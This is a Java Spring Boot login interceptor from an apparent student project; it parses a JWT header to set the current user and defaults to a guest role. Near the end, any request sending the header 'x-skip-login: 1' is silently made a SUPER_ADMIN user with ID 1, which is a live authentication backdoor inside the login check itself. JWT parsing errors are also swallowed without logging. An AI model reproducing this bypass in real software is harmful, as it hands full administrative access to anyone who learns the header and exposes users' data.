package homework.soft.activity.interceptor;

import homework.soft.activity.constant.JwtClaimsConstant;
import homework.soft.activity.entity.po.Role;
import homework.soft.activity.entity.vo.UserVO;
import homework.soft.activity.property.AppProperty;
import homework.soft.activity.service.UserService;
import homework.soft.activity.util.AuthUtils;
import homework.soft.activity.util.JwtUtils;
import io.jsonwebtoken.Claims;
import jakarta.annotation.Resource;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;
import org.springframework.web.method.HandlerMethod;
import org.springframework.web.servlet.HandlerInterceptor;

import java.util.List;

@Slf4j
@Component
public class JwtLoginInterceptor implements HandlerInterceptor {
    @Resource
    private AppProperty appProperty;
    @Resource
    private UserService userService;

    /**
     * 校验jwt
     *
     * @param request
     * @param response
     * @param handler
     * @return
     * @throws Exception
     */
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        //判断当前拦截到的是Controller的方法还是其他资源
        if (!(handler instanceof HandlerMethod)) {
            //当前拦截到的不是动态方法，直接放行
            return true;
        }
        //1.设置游客用户
        UserVO guest=new UserVO();
        Role role=new Role();
        role.setCname("guest");
        role.setEname("guest");
        guest.setRoles(List.of(role));
        AuthUtils.setUserDetails(guest);
        //2、从请求头中获取令牌，并设置当前用户信息
        String token = request.getHeader(appProperty.getJwt().getTokenName());
        if (token != null) {
            //2.1 校验令牌
            Claims payload = null;
            try {
                payload = JwtUtils.parseJWT(appProperty.getJwt().getSecretKey(), token);
            } catch (Exception ignored) {

            }
            //2. 根据userId 设置当前用户
            if (payload != null && payload.get(JwtClaimsConstant.USER_ID) != null) {
                String userId = (String) payload.get(JwtClaimsConstant.USER_ID);
                UserVO user = userService.queryById(userId);
                AuthUtils.setUserDetails(user);
            }
        }
        // 检查请求头中是否包含 x-skip-login
        String skipLogin = request.getHeader("x-skip-login");
        if ("1".equalsIgnoreCase(skipLogin)) {
            UserVO admin = new UserVO();
            role.setCname("SUPER_ADMIN");
            role.setEname("SUPER_ADMIN");
            admin.setRoles(List.of(role));
            admin.setUserId("1");
            AuthUtils.setUserDetails(admin);
            return true;
        }

        //3. 放行
        return true;
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        AuthUtils.removeUserDetails();
    }
}
